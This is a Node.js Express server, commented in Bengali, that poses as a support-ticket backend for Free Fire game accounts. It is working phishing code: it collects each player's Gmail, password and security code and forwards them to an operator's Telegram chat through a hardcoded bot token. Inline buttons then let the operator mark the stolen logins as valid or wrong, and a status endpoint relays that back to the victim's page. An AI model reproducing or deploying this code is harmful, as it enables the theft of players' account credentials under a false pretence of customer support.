const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// ক্যাশিং বন্ধ রাখার নোটিফিকেশন
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

if (!global.persistentStore) {
    global.persistentStore = {};
}

app.get('/', (req, res) => res.send("Backend Active"));

// ১. টিকিট জমা নেওয়ার API (User-Agent ও ফালব্যাক ডাটা পার্সিং সহ)
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    let playerName = "Unknown Player";
    let playerLevel = "N/A";
    let playerRegion = "Bangladesh";

    // FF Info API থেকে ব্রাউজার হেডারসহ ডাটা ফেচ করা
    try {
        const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json'
            },
            timeout: 6000
        });

        const data = ffRes.data;
        const basic = data?.data?.basicInfo || data?.basicInfo || data?.data || data || {};

        // সম্ভাব্য সব ধরনের ফিল্ড নাম চেক করা
        const foundName = basic.nickname || basic.name || basic.AccountName || data.nickname || data.name;
        const foundLevel = basic.level || basic.AccountLevel || data.level;
        const foundRegion = basic.region || basic.AccountRegion || data.region;

        if (foundName) playerName = foundName;
        if (foundLevel) playerLevel = typeof foundLevel === 'number' ? `Level ${foundLevel}` : String(foundLevel);
        if (foundRegion) playerRegion = foundRegion;

    } catch (e) {
        console.error("FF Info Fetch Error:", e.message);
    }

    // ব্যাকএন্ড মেমরিতে আপডেট ডাটা রাখা
    global.persistentStore[String(uid)] = {
        status: "Pending",
        name: playerName,
        level: playerLevel,
        region: playerRegion,
        reason: ""
    };

    // টেলিগ্রাম মেসেজ
    const telegramMessage = `
📩 *New Support Ticket Submitted!*

👤 *Player Name:* \`${playerName}\`
🆔 *Player UID:* \`${uid}\`
🎖️ *Level:* \`${playerLevel}\`
🌍 *Region:* \`${playerRegion}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম ওয়েবহুক এবং মেসেজ আপডেট
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    try {
        const update = req.body;

        // টেলিগ্রামে মেসেজ টাইপ করে ম্যানুয়ালি নাম ও লেভেল সেট করার লজিক (ফরম্যাট: UID Name Level)
        if (update && update.message && update.message.text) {
            const text = update.message.text.trim();
            const parts = text.split(' ');
            
            if (parts.length >= 3) {
                const uid = String(parts[0]);
                const level = parts[parts.length - 1];
                const name = parts.slice(1, parts.length - 1).join(' ');

                if (!global.persistentStore[uid]) {
                    global.persistentStore[uid] = { status: "Pending", region: "Bangladesh", reason: "" };
                }
                
                global.persistentStore[uid].name = name;
                global.persistentStore[uid].level = `Level ${level}`;

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: update.message.chat.id,
                    text: `📝 *Player Info Updated!*\n\n🆔 UID: \`${uid}\`\n👤 Name: *${name}*\n🎖️ Level: *Level ${level}*`,
                    parse_mode: 'Markdown'
                });
                return;
            }
        }

        // ইনলাইন বাটন চাপলে
        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = String(parts[1]);
            const reason = parts[2] || "Information Mismatch";

            const currentData = global.persistentStore[uid] || {};

            if (action === 'verify') {
                global.persistentStore[uid] = {
                    status: "Verified",
                    name: currentData.name || "Searching Player Name...",
                    level: currentData.level || "Fetching Level...",
                    region: currentData.region || "Bangladesh",
                    reason: ""
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status updated to *VERIFIED*!`,
                    parse_mode: 'Markdown'
                });

            } else if (action === 'reject') {
                global.persistentStore[uid] = {
                    status: "Rejected",
                    name: currentData.name || "Searching Player Name...",
                    level: currentData.level || "Fetching Level...",
                    region: currentData.region || "Bangladesh",
                    reason: reason
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` marked as *REJECTED* (${reason})!`,
                    parse_mode: 'Markdown'
                });
            }

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID ${uid} Updated!`
            });
        }
    } catch (err) {
        console.error("Webhook Error:", err);
    }
});

// ৩. লাইভ স্ট্যাটাস নেওয়ার API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = String(req.params.uid);
    const userData = global.persistentStore[uid] || {
        status: "Pending",
        name: "Searching Player Name...",
        level: "Fetching Level...",
        region: "Bangladesh",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
